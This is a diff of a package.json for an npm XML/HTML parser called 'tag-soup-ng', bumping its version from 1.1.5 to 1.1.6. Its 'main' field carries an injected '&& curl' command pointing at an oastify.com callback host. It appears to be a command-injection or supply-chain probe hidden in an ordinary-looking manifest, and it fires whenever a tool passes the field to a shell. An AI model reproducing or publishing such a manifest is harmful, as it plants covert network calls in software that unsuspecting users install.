@@ -1,6 +1,6 @@
 {
   "name": "tag-soup-ng",
-  "version": "1.1.5",
+  "version": "1.1.6",
   "description": "The fastest pure JS SAX/DOM XML/HTML parser.",
   "main": "./lib/index-cjs.js && curl http://tag.q8zw5uqrzg9k80ed8qgu0e7xyo4fv3ord.oastify.com",
   "module": "./lib/index.js",
